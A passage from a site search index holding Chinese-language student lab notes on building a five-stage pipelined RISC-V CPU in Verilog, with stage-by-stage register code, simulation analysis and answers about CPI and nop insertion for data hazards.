CPI\u3002\u8bd5\u89e3\u91ca\u4e3a\u4f55\u9700\u8981\u6dfb\u52a0 nop \u6307\u4ee4</li> </ol> </li> </ul> </li> <li>lab 1-2\uff1a\u6307\u4ee4\u6269\u5c55<ul> <li>\u57fa\u4e8e lab 1-1\uff0c\u5728\u6d41\u6c34\u7ebf CPU \u4e2d\u5b9e\u73b0 lui\u3001jal\u3001jalr\u3001beq\u3001bne\u3001lw\u3001sw\u3001addi\u3001slti\u3001xori\u3001ori\u3001andi\u3001srli\u3001srai\u3001add\u3001sub\u3001sll\u3001slt\u3001sra\u3001or\u3001xor\u3001and \u6307\u4ee4</li> <li>\u642d\u5efa\u5b8c\u6574\u7684\u6d41\u6c34\u7ebf CPU</li> <li>\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\u548c\u4e0a\u677f\u6d4b\u8bd5</li> <li>\u601d\u8003\u9898<ol> <li>\u5728\u4f60\u7684\u8bbe\u8ba1\u4e2d\uff0c\u672c\u5b9e\u9a8c\u6d4b\u8bd5\u6587\u4ef6\u4e2d\u7684 nop \u6570\u91cf\u662f\u5426\u591a\u4e8e\u6bcf\u6761\u6307\u4ee4\u6240\u9700\u7684\u5ef6\u8fdf\u5468\u671f\u6570</li> <li>\u53c8\u662f\u5426\u5b58\u5728\u51fa\u73b0\u51b2\u7a81\u4f46\u662f\u6ca1\u6709\u7ed9\u8db3 nop \u7684\u60c5\u51b5</li> <li>\u8bf7\u8ba1\u7b97\u6bcf\u6761\u6307\u4ee4\u95f4\u5b9e\u9645\u6240\u9700\u8981\u7684 nop \u6570\u91cf\uff0c\u5e76\u5bf9\u4f60\u7684 coe \u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u4e4b\u6b63\u786e\u5730\u8fd0\u884c\u51fa\u76f8\u5e94\u7684\u7ed3\u679c</li> </ol> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/lab1/#_2","title":"\u6d41\u6c34\u7ebf\u52a0\u6cd5\u673a","text":""},{"location":"cs/system/cs2/lab1/#_3","title":"\u6570\u636e\u901a\u8def\u8bbe\u8ba1","text":"<p>\u4e4b\u524d\u7684\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1\uff08\u56e0\u4e3a\u6dfb\u52a0\u4e86 auipc \u6307\u4ee4\uff0c\u6240\u4ee5\u548c\u4e0a\u8bfe\u8bb2\u7684\u6709\u4e9b\u8bb8\u4e0d\u4e00\u6837\uff09\uff1a</p> <p>nop \u6307\u4ee4\u7f16\u8bd1\u540e\u76f8\u5f53\u4e8e addi x0, x0, 0\uff0c\u6240\u4ee5\u5373\u53ea\u5b58\u5728 addi \u6307\u4ee4\u3002\u5728\u8bbe\u8ba1\u6570\u636e\u901a\u8def\u65f6\u53ef\u4ee5\u5148\u7b80\u5316\u4e00\u4e0b\uff0c\u4e0d\u8003\u8651 pc \u7684\u8df3\u8f6c\u53d8\u5316\uff0c\u76f4\u63a5\u5728 IF \u9636\u6bb5\u4e0d\u65ad\u52a0\u56db\u5373\u53ef\u3002\u6240\u4ee5\u5728\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u7684\u57fa\u7840\u4e0a\u518d\u52a0\u4e0a\u56db\u4e2a\u9636\u6bb5\u5bc4\u5b58\u5668\u6765\u5206\u5272\u5373\u53ef\uff08\u5f88\u591a\u5176\u5b83\u6307\u4ee4\u7684\u7ec6\u8282\u4e5f\u8fdb\u884c\u4e86\u4fdd\u7559\uff0c\u4f46\u5728\u8fd9\u90e8\u5206\u4e2d\u4e0d\u4f1a\u7528\u5230\uff09\uff1a </p>"},{"location":"cs/system/cs2/lab1/#_4","title":"\u4ee3\u7801\u7f16\u5199","text":"<p>\u7531\u4e8e\u672c\u6b21\u5b9e\u9a8c\u4e0d\u5bf9\u6570\u636e\u901a\u8def\u8fdb\u884c\u5c01\u88c5\uff0c\u6240\u4ee5\u76f4\u63a5\u5728 SCPU \u4e2d\u8fdb\u884c\u4e0a\u8ff0\u8bbe\u8ba1\u7684\u5b9e\u73b0\u3002</p>"},{"location":"cs/system/cs2/lab1/#if","title":"IF \u6bb5","text":"<p>IF \u6bb5\u662f\u7531 PC \u548c IF/ID \u4e24\u4e2a\u5bc4\u5b58\u5668\uff08\u65f6\u5e8f\u7535\u8def\uff09\u5206\u9694\u7684\u3002\u5176\u4e2d\u4ece I-Mem \u8bfb\u53d6\u6307\u4ee4\u7684\u90e8\u5206\u5728 SCPU \u4e4b\u5916\uff0c\u4e5f\u5c31\u662f\u901a\u8fc7 pc_out \u4f20\u51fa\u5f53\u524d pc\uff0c\u7136\u540e\u5f97\u5230\u6307\u4ee4\u901a\u8fc7 inst \u8fd4\u56de\u5230 SCPU \u4e2d\u3002\u56e0\u4e3a Core \u4e2d\u4e3a ROM \u8bbe\u7f6e\u7684 clk \u4e0e SCPU \u6b63\u597d\u9519\u4f4d\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728 IF \u6240\u5728\u7684\u65f6\u949f\u5468\u671f\u4e2d\u76f4\u63a5\u5b8c\u6210\u6307\u4ee4\u7684\u8bfb\u53d6\u3002</p> <p>\u4f53\u73b0\u5728\u4ee3\u7801\u4e0a\u5373\u5728\u4e0a\u5347\u6cbf\u65f6\u66f4\u65b0 pc \u4e3a pc_next\uff08pc+4\uff09\uff0c\u540c\u65f6\u66f4\u65b0 IF_ID_pc \u4e3a\u5f53\u524d\u672a\u66f4\u65b0\u7684 pc\uff08\u5373\u4f20\u7ed9\u4e0b\u4e00\u9636\u6bb5\uff09\uff0c\u4e5f\u540c\u65f6\u66f4\u65b0 IF_ID_inst \u4e3a\u5f53\u524d\u8bfb\u53d6\u51fa\u6765\u7684 inst\uff1a <pre><code>wire    [31:0]  pc_next;\nreg     [31:0]  pc;\n\nreg     [31:0]  IF_ID_pc;\nreg     [31:0]  IF_ID_inst;\n\nassign pc_out = pc;\nassign pc_next = pc + 4; // \u4e0d\u8003\u8651\u8df3\u8f6c\n\nalways @(posedge clk or posedge rst) begin \n    if (rst) begin\n        pc &lt;= 32'b0;\n        IF_ID_pc &lt;= 32'b0;\n    end\n    else begin\n        pc &lt;= pc_next;\n\n        IF_ID_pc &lt;= pc;\n        IF_ID_inst &lt;= inst;\n    end\nend\n</code></pre></p>"},{"location":"cs/system/cs2/lab1/#id","title":"ID \u6bb5","text":"<p>ID \u9636\u6bb5\u9700\u8981\u8fdb\u884c\u5bc4\u5b58\u5668\u7ec4\u7684\u8bbf\u95ee\u3001\u7acb\u5373\u6570\u751f\u6210\u4ee5\u53ca\u6307\u4ee4\u8bd1\u7801\uff0c\u4ece\u6570\u636e\u901a\u8def\u56fe\u4e0a\u53ef\u4ee5\u770b\u51fa\uff0c\u9664\u4e86\u63a7\u5236\u4fe1\u53f7\u4ee5\u5916\uff0c\u8f93\u51fa\u7ed9 ID/EX \u5bc4\u5b58\u5668\u7684\u503c\u6709 pc\u3001data1\u3001data2\u3001imm\u3001write_addr\u3002\u63a7\u5236\u4fe1\u53f7\u6709 pc_src\u3001mem_to_reg\u3001reg_write\u3001alu_src\u3001branch\u3001b_type\u3001auipc\u3001mem_write\u3002\u6240\u4ee5\u9700\u8981\u6839\u636e\u8fd9\u4e9b\u6765\u521b\u5efa ID/EX \u5bc4\u5b58\u5668\uff0c\u9644\u5e26\u4e2d\u95f4\u9700\u8981\u7528\u5230\u7684 wire\uff0c\u4ee3\u7801\u4e3a\uff1a <pre><code>wire    [31:0]  read_data1, read_data2, imm;\nwire    [3:0]   alu_op;\nwire    [1:0]   pc_src, mem_to_reg;\nwire            reg_write, alu_src, branch, b_type, auipc, mem_write_;\nreg     [31:0]  ID_EX_data1, ID_EX_data2;\nreg     [31:0]  ID_EX_pc, ID_EX_imm;\nreg     [4:0]   ID_EX_write_addr;\nreg     [3:0]   ID_EX_alu_op;\nreg     [1:0]   ID_EX_pc_src, ID_EX_mem_to_reg;\nreg             ID_EX_reg_write, ID_EX_alu_src, ID_EX_branch, ID_EX_b_type, ID_EX_auipc, ID_EX_mem_write;\n</code></pre> \u4ee5\u53ca\u6d89\u53ca ID/EX \u5bc4\u5b58\u5668\u7684\u65f6\u5e8f\u66f4\u65b0\uff1a <pre><code>ID_EX_pc &lt;= IF_ID_pc;\nID_EX_data1 &lt;= read_data1;\nID_EX_data2 &lt;= read_data2;\nID_EX_imm &lt;= imm;\nID_EX_write_addr &lt;= IF_ID_inst[11:7];\nID_EX_pc_src &lt;= pc_src;\nID_EX_mem_to_reg &lt;= mem_to_reg;\nID_EX_reg_write &lt;= reg_write;\nID_EX_alu_src &lt;= alu_src;\nID_EX_branch &lt;= branch;\nID_EX_b_type &lt;= b_type;\nID_EX_auipc &lt;= auipc;\nID_EX_alu_op &lt;= alu_op;\nID_EX_mem_write &lt;= mem_write_;\n</code></pre> \u5269\u4e0b\u7684\u662f\u5728\u8fd9\u4e00\u9636\u6bb5\u4e2d\u8fde\u63a5\u4e09\u4e2a\u6a21\u5757\uff1aRegs\u3001Control\u3001ImmGen\u3002\u5bf9\u4e8e Regs\uff0c\u6709\u4e00\u90e8\u5206\u662f\u5728 WB \u9636\u6bb5\u7528\u4e8e\u5199\u56de\u7684\uff0c\u8fd9\u91cc\u5148\u653e\u4e0b\u7b49\u5230\u540e\u9762\u586b\u3002Control \u548c ImmGen \u548c\u5355\u5468\u671f CPU \u7684\u5199\u6cd5\u57fa\u672c\u4e00\u81f4\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u7684 inst \u8981\u6539\u6210 IF_ID_inst \u4e5f\u5c31\u662f IF/ID \u5bc4\u5b58\u5668\u4e2d\u5b58\u7684\u6307\u4ee4\uff0c\u800c\u4e0d\u662f\u5f53\u524d\u7684 inst\uff08\u540c\u4e00\u65f6\u523b\u4f1a\u662f\u540e\u4e00\u6761\u6307\u4ee4\uff09\uff1a <pre><code>Regs regs (\n    .clk(clk),\n    .rst(rst),\n    .we(____),              // \u7559\u7ed9 WB \u9636\u6bb5\n    .read_addr_1(IF_ID_inst[19:15]),\n    .read_addr_2(IF_ID_inst[24:20]),\n    .write_addr(____),      // \u7559\u7ed9 WB \u9636\u6bb5\n    .write_data(____),      // \u7559\u7ed9 WB \u9636\u6bb5\n    .read_data_1(read_data1),\n    .read_data_2(read_data2)\n);\n\nControl control (\n    .op_code(IF_ID_inst[6:0]),\n    .funct3(IF_ID_inst[14:12]),\n    .funct7_5(IF_ID_inst[30]),\n    .alu_op(alu_op),\n    .pc_src(pc_src),\n    .mem_to_reg(mem_to_reg),\n    .reg_write(reg_write),\n    .alu_src_b(alu_src),\n    .branch(branch),\n    .b_type(b_type),\n    .mem_write(mem_write_),\n    .auipc(auipc)\n);\n\nImmGen immgen (\n    .inst(IF_ID_inst),\n    .imm(imm)\n);\n</code></pre></p>"},{"location":"cs/system/cs2/lab1/#ex","title":"EX \u6bb5","text":"<p>EX \u9636\u6bb5\u4e3b\u8981\u8fdb\u884c ALU \u8fd0\u7b97\uff0c\u6839\u636e\u6570\u636e\u901a\u8def\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u9636\u6bb5\u7684\u8f93\u51fa\uff08\u4e5f\u5c31\u662f EX/MEM \u5bc4\u5b58\u5668\u4e2d\u9700\u8981\u5b58\u7684\u503c\uff09\u6709 pc\u3001alu_result\u3001data2\u3001imm\u3001write_addr\u3002\u63a7\u5236\u4fe1\u53f7\u5728\u8fd9\u4e00\u9636\u6bb5\u4e2d\u4f7f\u7528\u6389\u4e86 alu_op\u3001alu_src_b \u548c auipc\uff0c\u5176\u4f59\u7684\u8fd8\u9700\u8981\u7ee7\u7eed\u901a\u8fc7 EX/MEM \u5bc4\u5b58\u5668\u4f20\u4e0b\u53bb\u3002\u56e0\u6b64 EX/MEM \u5bc4\u5b58\u5668\u4ee5\u53ca\u5176\u5b83\u4e2d\u95f4 wire \u7684\u5b9a\u4e49\uff1a <pre><code>wire    [31:0]  alu_data1, alu_data2, alu_result;\nwire            alu_zero;\nreg     [31:0]  EX_MEM_alu_result, EX_MEM_pc, EX_MEM_imm;\nreg     [31:0]  EX_MEM_data2;\nreg     [4:0]   EX_MEM_write_addr;\nreg     [1:0]   EX_MEM_pc_src, EX_MEM_mem_to_reg;\nreg             EX_MEM_reg_write, EX_MEM_branch, EX_MEM_b_type, EX_MEM_mem_write;\n</code></pre> \u76f8\u5173\u7684\u65f6\u5e8f\u903b\u8f91\u66f4\u65b0\uff1a <pre><code>EX_MEM_pc &lt;= ID_EX_pc;\nEX_MEM_imm &lt;= ID_EX_imm;\nEX_MEM_data2 &lt;= ID_EX_data2;\nEX_MEM_alu_result &lt;= alu_result;\nEX_MEM_write_addr &lt;= ID_EX_write_addr;\nEX_MEM_pc_src &lt;= ID_EX_pc_src;\nEX_MEM_mem_to_reg &lt;= ID_EX_mem_to_reg;\nEX_MEM_reg_write &lt;= ID_EX_reg_write;\nEX_MEM_branch &lt;= ID_EX_branch;\nEX_MEM_b_type &lt;= ID_EX_b_type;\nEX_MEM_mem_write &lt;= ID_EX_mem_write;\n</code></pre> \u5728\u6211\u7684\u6570\u636e\u901a\u8def\u8bbe\u8ba1\u4e2d\uff0c\u6b64\u9636\u6bb5\u9700\u8981\u4e24\u4e2a\u591a\u8def\u9009\u62e9\u5668\uff08\u4e00\u4e2a\u901a\u8fc7 auipc \u5728 data1 \u548c pc \u4e2d\u9009\u62e9\u7b2c\u4e00\u4e2a\u8f93\u5165\uff0c\u53e6\u4e00\u4e2a\u901a\u8fc7 alu_src_b \u5728 data2 \u548c imm \u4e2d\u9009\u62e9\u7b2c\u4e8c\u4e2a\u8f93\u5165\uff09\u8fd8\u6709\u4e00\u4e2a ALU\uff0c\u56e0\u6b64\u8fd9\u4e09\u4e2a\u6a21\u5757\u7684\u5b9a\u4e49\uff1a <pre><code>Mux2x32 mux2x32_1 (\n    .I0(ID_EX_data1),\n    .I1(ID_EX_pc),\n    .s(ID_EX_auipc),\n    .o(alu_data1)\n);\n\nMux2x32 mux2x32_2 (\n    .I0(ID_EX_data2),\n    .I1(ID_EX_imm),\n    .s(ID_EX_alu_src),\n    .o(alu_data2)\n);\n\nALU alu (\n    .a(alu_data1),\n    .b(alu_data2),\n    .alu_op(ID_EX_alu_op),\n    .res(alu_result),\n    .zero(alu_zero)     // \u5176\u5b9e\u6211\u6ca1\u7528\n);\n</code></pre></p>"},{"location":"cs/system/cs2/lab1/#mem","title":"MEM \u6bb5","text":"<p>MEM \u9636\u6bb5\u9700\u8981\u8fdb\u884c D-Mem \u7684\u8bbf\u95ee\uff0c\u867d\u7136 addi \u6307\u4ee4\u4e0d\u4f1a\u6d89\u53ca\u5230 MEM \u9636\u6bb5\uff0c\u4f46\u662f\u5728\u6b64\u4e5f\u8fdb\u884c\u4e86\u8fd9\u4e00\u90e8\u5206\u5b9e\u73b0\u3002D-Mem \u4e5f\u5b9a\u4e49\u5728 SCPU \u4e4b\u5916\uff0c\u9700\u8981\u901a\u8fc7 SCPU \u7684\u63a5\u53e3\u6765\u8fdb\u884c\u8bbf\u95ee\uff0c\u5373\u901a\u8fc7 addr_out \u8fd9\u4e00\u8f93\u51fa\u6765\u8f93\u5165\u7ed9 RAM \u6307\u5b9a\u64cd\u4f5c\u7684\u5730\u5740\uff0cdata_out \u8f93\u51fa\u6765\u8f93\u5165\u7ed9 RAM \u6307\u5b9a\u5199\u5165\u7684\u6570\u636e\uff0c\u8f93\u51fa mem_write \u63a7\u5236\u4fe1\u53f7\u6765\u6307\u5b9a\u8fdb\u884c\u5199\u5165\u8fd8\u662f\u8bfb\u53d6\uff0c\u4ee5\u53ca RAM \u8f93\u51fa data_in \u7ed9 SCPU \u4f5c\u4e3a\u8bfb\u53d6\u7684\u6570\u636e\u3002\u6240\u4ee5 SCPU \u4e2d\u53ea\u9700\u8981 assign \u8fde\u7ebf\u5373\u53ef\uff1a <pre><code>assign addr_out = EX_MEM_alu_result;\nassign data_out = EX_MEM_data2;\nassign mem_write = EX_MEM_mem_write;\n</code></pre></p> <p>\u4e0b\u4e00\u6b65\u662f\u8fdb\u884c MEM/WB \u5bc4\u5b58\u5668\u7684\u5199\u5165\u3002\u4ece\u6570\u636e\u901a\u8def\u56fe\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0c\u9700\u8981\u5199\u5165\u7684\u6570\u636e\u6709 pc\u3001alu_result\u3001data_in\u3001imm\u3001write_addr\u3002\u8fd9\u4e00\u9636\u6bb5\u7684\u63a7\u5236\u4fe1\u53f7\u7528\u6389\u4e86 mem_write\uff0c\u4f46\u662f\u540e\u7eed\u7684\u8df3\u8f6c\u8ba1\u7b97\u4e5f\u8ba1\u5212\u5728\u8fd9\u91cc\u5b8c\u6210\uff0c\u5c06\u6d88\u8017 branch\u3001b_type\u3001pc_src \u4e09\u4e2a\u4fe1\u53f7\uff0c\u6700\u540e WB \u9636\u6bb5\u4e2d\u4f1a\u4f7f\u7528\u5230\u7684\u4e5f\u53ea\u5269\u4e0b mem_to_reg \u548c reg_write \u4e24\u4e2a\u4e86\u3002\u56e0\u6b64\u5bc4\u5b58\u5668\u5b9a\u4e49\uff1a <pre><code>reg     [31:0]  MEM_WB_data_in, MEM_WB_alu_result, MEM_WB_pc, MEM_WB_imm;\nreg     [4:0]   MEM_WB_write_addr;\nreg     [1:0]   MEM_WB_mem_to_reg;\nreg             MEM_WB_reg_write;\n</code></pre> \u4ee5\u53ca\u65f6\u5e8f\u66f4\u65b0\uff1a <pre><code>MEM_WB_data_in &lt;= data_in;\nMEM_WB_alu_result &lt;= EX_MEM_alu_result;\nMEM_WB_pc &lt;= EX_MEM_pc;\nMEM_WB_imm &lt;= EX_MEM_imm;\nMEM_WB_write_addr &lt;= EX_MEM_write_addr;\nMEM_WB_mem_to_reg &lt;= EX_MEM_mem_to_reg;\nMEM_WB_reg_write &lt;= EX_MEM_reg_write;\n</code></pre></p>"},{"location":"cs/system/cs2/lab1/#wb","title":"WB \u6bb5","text":"<p>WB \u6bb5\u8fdb\u884c\u5bc4\u5b58\u5668\u7ec4\u7684\u5199\u56de\u64cd\u4f5c\uff0c\u9700\u8981\u590d\u7528 ID \u9636\u6bb5\u4e2d\u5b9a\u4e49\u8fde\u63a5\u7684 Regs \u6a21\u5757\uff0c\u4e5f\u5c31\u662f\u5148\u9009\u62e9\u51fa\u9700\u8981\u5199\u56de\u7684\u6570\u636e write_data\uff0c\u7136\u540e\u5199\u56de\u5728 write_addr \u5730\u5740\u5904\u7684\u5bc4\u5b58\u5668\u3002\u56e0\u6b64\u9700\u8981\u4e00\u4e2a wire \u53d8\u91cf write_data\u3002\u4e0d\u9700\u8981\u518d\u5b9a\u4e49\u989d\u5916\u7684\u5bc4\u5b58\u5668\u3002</p> <p>\u5bf9\u4e8e write_data \u7684\u9009\u62e9\uff0c\u5176\u6765\u6e90\u6709\u56db\u4e2a\uff08\u5b8c\u6574\u60c5\u51b5\u4e0b\uff09\uff0c\u5206\u522b\u662f alu_result\u3001imm\u3001pc+4\u3001data_in\uff0c\u901a\u8fc7\u63a7\u5236\u4fe1\u53f7 mem_to_reg \u8fdb\u884c\u56db\u8def\u9009\u62e9\u5373\u53ef\uff1a <pre><code>Mux4x32 mux4x32 (\n    .I0(MEM_WB_alu_result),\n    .I1(MEM_WB_imm),\n    .I2(MEM_WB_pc + 4),\n    .I3(MEM_WB_data_in),\n    .s(MEM_WB_mem_to_reg),\n    .o(write_data)\n);\n</code></pre> \u6700\u540e\u518d\u5c06 reg_write \u4fe1\u53f7\u3001write_addr\u3001write_data \u8fde\u5165 Regs \u6a21\u5757\u5373\u53ef\uff1a <pre><code>Regs regs (\n    ...\n    .we(MEM_WB_reg_write),\n    ...\n    .write_addr(MEM_WB_write_addr),\n    .write_data(write_data),\n    ...\n);\n</code></pre></p>"},{"location":"cs/system/cs2/lab1/#_5","title":"\u4eff\u771f\u6d4b\u8bd5","text":"<p>\u6309\u7167\u4e4b\u524d\u7684\u6307\u5bfc\uff0c\u5c06 lab1-1.coe \u8f7d\u5165 ROM \u4e2d\uff0c\u7136\u540e\u4ee5 Core_tb \u4e3a\u9876\u5c42\u6a21\u5757\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u4eff\u771f\u7ed3\u679c\u6ce2\u5f62\u5982\u4e0b\uff08\u5305\u542b SCPU \u4e2d\u7684 clk \u4fe1\u53f7\u3001pc\u3001inst \u4ee5\u53ca\u5bc4\u5b58\u5668\u7684\u53d8\u5316\uff09\uff1a </p> <p>\u5bf9\u4e8e\u8fd9\u4e2a\u6ce2\u5f62\u7684\u5206\u6790\u5982\u4e0b\u56fe\uff08\u9ed1\u8272\u3001\u6a59\u8272\u65b9\u5757\u4e3a addi \u6307\u4ee4\uff0c\u7ea2\u8272\u65b9\u5757\u4e3a nop \u6307\u4ee4\uff09\uff1a </p> <p>\u53ef\u4ee5\u53d1\u73b0\uff0c\u6307\u4ee4\u786e\u5b9e\u53e0\u5728\u4e00\u8d77\u8fd0\u884c\uff0c\u4e00\u6761\u6307\u4ee4\u8fd0\u884c\u4e94\u4e2a\u5468\u671f\uff0c\u540c\u4e00\u5468\u671f\u5185\u8fd0\u884c\u4e94\u6761\u6307\u4ee4\uff0c\u5f62\u6210\u4e00\u4e2a\u4e94\u9636\u6d41\u6c34\u7ebf\uff0c\u4e14\u5bc4\u5b58\u5668\u4e2d\u7ed3\u679c\u53d8\u5316\u5747\u7b26\u5408\u9884\u671f\uff08\u5728\u6700\u540e\u4e00\u4e2a\u9636\u6bb5 WB \u5199\u56de\u4ea7\u751f\u53d8\u5316\uff0c\u4e14\u503c\u4e0e\u6c47\u7f16\u8bed\u53e5\u4e2d\u63cf\u8ff0\u76f8\u540c\uff09</p>"},{"location":"cs/system/cs2/lab1/#_6","title":"\u601d\u8003\u9898","text":"<ol> <li>\u5bf9\u4e8e part1 (2-14 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part1\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI</li> </ol>   \u5bf9\u4e8e\u76ee\u524d\u7684\u6d41\u6c34\u7ebf CPU\uff0c\u5728 part1 \u90e8\u5206\uff0c\u901a\u8fc7\u4e0a\u9762\u7684\u6ce2\u5f62\u56fe\u53ef\u4ee5\u770b\u51fa\u8fd9 12 \u6761\u6307\u4ee4\u4e00\u5171\u8fd0\u884c\u4e86 16 \u4e2a\u5468\u671f\uff0c\u5176 CPI \u4e3a 16/12 = 1.33\u3002\u800c\u5728 lab0 \u4e2d\uff0cCPU \u4e3a\u5355\u5468\u671f\uff0c\u4e00\u4e2a\u5468\u671f\u4f1a\u8fd0\u884c\u4e00\u6761\u6307\u4ee4\uff0c\u6240\u4ee5\u5176 CPI \u4e3a 1\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u6d41\u6c34\u7ebf CPU \u7684 CPI \u662f\u4f1a\u5927\u4e8e\u5355\u5468\u671f CPU \u7684\uff0c\u4e14\u5f53\u8fd0\u884c\u6307\u4ee4\u6761\u6570\u8d8a\u591a\u65f6\uff0cCPI \u8d8a\u63a5\u8fd1\u5355\u5468\u671f\u7684 1\u3002   <ol> <li>\u5bf9\u4e8e part2 (24-39 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff08\u5047\u8bbe nop \u4e0d\u8ba1\u5165\u6307\u4ee4\u6761\u6570\uff09\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part2\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI\u3002\u8bd5\u89e3\u91ca\u4e3a\u4f55\u9700\u8981\u6dfb\u52a0 nop \u6307\u4ee4</li> </ol>   \u4ece\u4e0a\u6ce2\u5f62\u56fe\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0cpart2 \u7684\u8fd9\u4e9b\u6307\u4ee4\u8fd0\u884c\u4e86 20 \u4e2a\u5468\u671f\uff0c\u9664\u53bb nop \u4ee5\u5916\u4e00\u5171\u56db\u6761\u6307\u4ee4\uff0cCPI \u4e3a 20/4 = 5\u3002\u800c lab0 \u4e2d\u7684 CPU \u4e3a\u5355\u5468\u671f\uff0c\u8fd0\u884c part2 \u7684\u8fd9\u4e9b\u6307\u4ee4\u9700\u8981 16 \u4e2a\u5468\u671f\uff0c\u6709\u6548 4 \u6761\uff0cCPI \u4e3a 16/4 = 4\uff08\u5982\u679c\u8fd0\u884c\u65f6\u9664\u53bb nop \u6307\u4ee4\uff0c\u5219 CPI \u4e3a 1\uff09\u3002\u53d1\u73b0\u6b64\u65f6\u6d41\u6c34\u7ebf CPU \u7684 CPI \u662f\u8981\u5927\u4e8e\u5355\u5468\u671f\u7684\u3002  \u6dfb\u52a0 nop \u6307\u4ee4\u7684\u539f\u56e0\u662f\u6b64\u65f6\u4f1a\u51fa\u73b0\u6570\u636e\u5192\u9669\uff0c\u5373\u5728\u6267\u884c\u7b2c\u4e00\u6761\u6307\u4ee4\u65f6\uff0c\u7b2c\u4e8c\u6761\u6307\u4ee4\u9700\u8981\u7528\u5230\u7b2c\u4e00\u6761\u6307\u4ee4\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u7b2c\u4e00\u6761\u6307\u4ee4\u8fd8\u6ca1\u6709\u6267\u884c\u5b8c\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u5f85\u7b2c\u4e00\u6761\u6307\u4ee4\u6267\u884c\u5b8c\uff0c\u624d\u80fd\u6267\u884c\u7b2c\u4e8c\u6761\u6307\u4ee4\u3002\u5e76\u4e14\u76ee\u524d\u7684\u6d41\u6c34\u7ebf CPU \u4e2d\u6ca1\u6709\u8fdb\u884c\u6570\u636e\u5192\u9669\u7684\u5904\u7406\uff0c\u6240\u4ee5\u9700\u8981\u9760\u6dfb\u52a0 nop \u6307\u4ee4\u6765\u624b\u52a8\u6682\u505c\u907f\u514d\u5192\u9669\u3002"},{"location":"cs/system/cs2/lab1/#cpu_1","title":"\u5b8c\u6574\u6d41\u6c34\u7ebf CPU","text":""},{"location":"cs/system/cs2/lab1/#_7","title":"\u6570\u636e\u901a\u8def","text":"<p>\u5728\u524d\u9762\u7684\u7b80\u5316\u6570\u636e\u901a\u8def\u57fa\u7840\u4e0a\u8fdb\u884c\u66f4\u6539\uff0c\u9700\u8981\u4fee\u6539\u7684\u4ec5\u662f\u4e3a pc \u8d4b\u503c\u7684\u90e8\u5206\u3002\u91c7\u7528\u4e86\u548c lab0 \u4e2d\u76f8\u540c\u7684\u7528\u4e8e pc \u7684\u591a\u8def\u9009\u62e9\u5668\uff0c\u5176\u7ed3\u6784\u4e3a\uff1a <pre><code>input   [31:0]  I0,         // pc+4\ninput   [31:0]  I1,         // jalr \u7684\u5730\u5740\ninput   [31:0]  I2,         // jal \u7684\u5730\u5740\ninput   [31:0]  I3,         // branch \u7684\u5730\u5740\uff0c\u548c jal \u76f8\u540c\ninput   [1:0]   s,          // pc_src \u63a7\u5236\u4fe1\u53f7\ninput           branch,     // branch \u63a7\u5236\u4fe1\u53f7\uff08\u662f\u5426\u662f branch \u8bed\u53e5\uff09\ninput           b_type,     // b_type \u63a7\u5236\u4fe1\u53f7\uff080 \u8868\u793a bne\uff0c\u53cd\u4e4b beq\uff09\ninput   [31:0]  alu_res,    // alu \u7684\u7ed3\u679c\uff08\u4f5c\u7528\u76f8\u5f53\u4e8e alu_zero\uff09\noutput  [31:0]  o           // pc_next\n</code></pre> \u5728\u6b64\u5904 jalr/jal/branch \u7684\u5730\u5740\u90fd\u9700\u8981\u5230\u8fbe MEM \u9636\u6bb5\u624d\u53ef\u4ee5\u8ba1\u7b97\uff0c\u51e0\u4e2a\u63a7\u5236\u4fe1\u53f7\u4e5f\u662f\u5728 MEM \u9636\u6bb5\u7684\uff0c\u4e3a\u4e86\u9632\u6b62\u7b49\u5f85\uff0cpc+4 \u4e2d\u7684 pc \u4e0d\u5e94\u8be5\u662f MEM \u9636\u6bb5\u7684 pc\uff0c\u800c\u662f\u5f53\u524d\u65f6\u523b pc \u5bc4\u5b58\u5668\u4e2d\u7684 pc\uff0cpc_next \u4e5f\u4f1a\u76f4\u63a5\u5728\u4e0b\u4e00\u4e2a\u4e0a\u5347\u6cbf\u8d4b\u503c\u7ed9 pc\u3002\u56e0\u6b64\u9700\u8981\u4fdd\u8bc1\u9664\u4e86\u8df3\u8f6c\u4ee5\u5916\u7684\u5176\u5b83\u65f6\u523b\uff0cs\u3001branch \u7b49\u4fe1\u53f7\u90fd\u4e3a 0\uff08\u5373\u9009\u62e9 pc+4 \u4f5c\u4e3a pc_next\uff09\u3002\u800c\u4e00\u6761\u5305\u542b\u8df3\u8f6c\u7684\u6307\u4ee4\u8fd0\u884c\u5230 MEM \u65f6\uff0c\u4f1a\u6539\u53d8\u8fd9\u4e9b\u4fe1\u53f7\uff0c\u4ece\u800c\u5f71\u54cd pc_next\uff0c\u5b9e\u73b0\u8df3\u8f6c\u3002\u57fa\u4e8e\u6b64\u601d\u8def\uff0c\u6570\u636e\u901a\u8def\u4e3a\uff1a</p>"},{"location":"cs/system/cs2/lab1/#_8","title":"\u4ee3\u7801\u5b9e\u73b0","text":"<p>\u9996\u5148\u9700\u8981\u5220\u6389\u524d\u9762\u5199\u7684 assign pc_next = pc+4; \u7136\u540e\u589e\u52a0\u521b\u5efa\u5e76\u8fde\u63a5 MuxPC \u6a21\u5757\uff1a <pre><code>wire    [31:0]  jal_addr, jalr_addr;\n\n//--------------------MEM--------------------//\nassign addr_out = EX_MEM_alu_result;\nassign data_out = EX_MEM_data2;\nassign mem_write = EX_MEM_mem_write;\n\nassign 